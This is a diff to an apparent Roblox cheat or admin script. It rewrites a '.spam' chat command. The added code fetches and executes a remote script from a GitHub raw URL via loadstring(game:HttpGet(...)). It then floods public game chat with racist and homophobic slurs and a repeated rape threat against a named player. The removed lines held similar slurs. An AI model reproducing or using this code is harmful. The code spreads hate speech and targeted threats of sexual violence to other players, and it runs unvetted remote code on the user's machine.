@@ -746,10 +746,38 @@ elseif cmd == ".spin" then
 		setControlsEnabled(origin, true)
 
 	elseif cmd == ".spam" then
-		local spamMessage = "nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot"
-		for _ = 1, 9 do -- Spam 9 times
-			Chat(spamMessage)
-		end
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/refs/heads/main/Anthony's%20ACL"))()
+wait(1)
+local function Chat(msg)
+    -- Check if we're using the old chat system
+    local oldChat = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+    
+    -- Send message using the old chat system if it exists
+    if oldChat then
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+    else
+        -- Send message using the new TextChatService
+        local textChatService = game:GetService("TextChatService")
+        local channel = textChatService.TextChannels.RBXGeneral
+        channel:SendAsync(msg)
+    end
+end
+
+-- Call the Chat function
+Chat("nigga faggot motherfucker")
+Chat("ill rape sour asshole nigger")
+Chat("ill rape sour asshole nigger")
+Chat("ill rape sour asshole nigger")
+Chat("ill rape sour asshole nigger")
+Chat("ill rape sour asshole nigger")
+Chat("ill rape sour asshole nigger")
+Chat("ill rape sour asshole nigger")
+Chat("ill rape sour asshole nigger")
+Chat("ill rape sour asshole nigger")
+Chat("ill rape sour asshole nigger")
+Chat("ill rape sour asshole nigger")
+Chat("ill rape sour asshole nigger")
+
 
 	elseif cmd == ".warn" then
 		-- Warning GUI code here (same as in the original script)
